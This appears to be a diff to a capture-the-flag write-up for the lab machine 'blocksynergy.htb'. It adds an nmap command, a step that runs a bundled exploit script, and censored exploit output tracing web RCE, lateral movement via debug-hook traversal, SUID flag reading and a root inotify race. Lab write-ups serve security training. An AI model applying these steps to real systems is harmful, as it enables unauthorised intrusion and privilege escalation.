@@ -26,12 +26,41 @@ nmap -p22,8080 -sC -sV -O -oA complete-scan.txt blocksynergy.htb
 
 2. Continue manual enumeration of discovered services (web, SSH, etc.) based on the scan results.
 
-3. If an exploit is available that requires a particular profile/rank or configuration, run it. If you do not have the required profile, continue intended/manual enumeration to obtain appropriate access.
+3. If there is an available exploit that requires a particular profile/rank or configuration, run it. If the exploit requires a specific account/profile and you don't have it, continue intended/manual enumeration to obtain the required access.
 
 4. To run the bundled exploit script and read the flags:
 
 ```bash
 python complete-exploit.py -t blocksynergy.htb
+```
+
+## Example exploit output (censored)
+
+Below is an example run of the exploit with sensitive values censored. This documents the high-level steps and outcome without exposing full flags or secrets.
+
+```
+[*] step 1: wallet 'w84eb2329' + forge coins
+[*]     balance funded, VIP unlocked
+[*] step 3: RCE as the web user (id):
+[*]     uid=1000(walter) gid=1000(walter) groups=1000(walter)
+[*] step 4: lateral to the dev user via :5000 debug-hook traversal
+[*]     dev user = hank
+[*]     SSH as hank established
+[*] step 4.5: retrieving user flag...
+[*]     user flag not in common locations, searching...
+[*]     trying with SUID binary to read user flag...
+[*]     user flag found via SUID binary
+[*] step 5: root via restore-daemon inotify race
+[*]     payload: /var/restore_work/.pl_84eb2329.tar.gz 689837
+[*]     racer armed; waiting for the restore cycle (up to ~7 min)...
+[*] root achieved.
+
+============================================================
+BLOCKSYNERGY FLAGS:
+============================================================
+USER FLAG  : b081440fcb190xxxxxxxxxxxxxxxxxxxxx
+ROOT FLAG  : c72b91821e7f58xxxxxxxxxxxxxxxxxxxx
+============================================================
 ```
 
 ## Notes
